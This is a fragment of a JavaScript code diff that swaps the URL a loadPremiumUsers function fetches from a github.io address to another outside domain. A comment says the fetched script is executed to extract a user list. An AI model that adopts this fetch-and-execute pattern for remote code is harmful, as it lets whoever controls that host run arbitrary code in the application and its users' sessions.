@@ -3,7 +3,7 @@ let premiumUsers = [];
 
 async function loadPremiumUsers() {
   try {
-    const res = await fetch("https://afkft.github.io/ho/da/premiumlist.js");
+    const res = await fetch("https://intelseller.com/premiumlist.js");
     const text = await res.text();
 
     // Execute premiumlist.js and extract premiumUsers
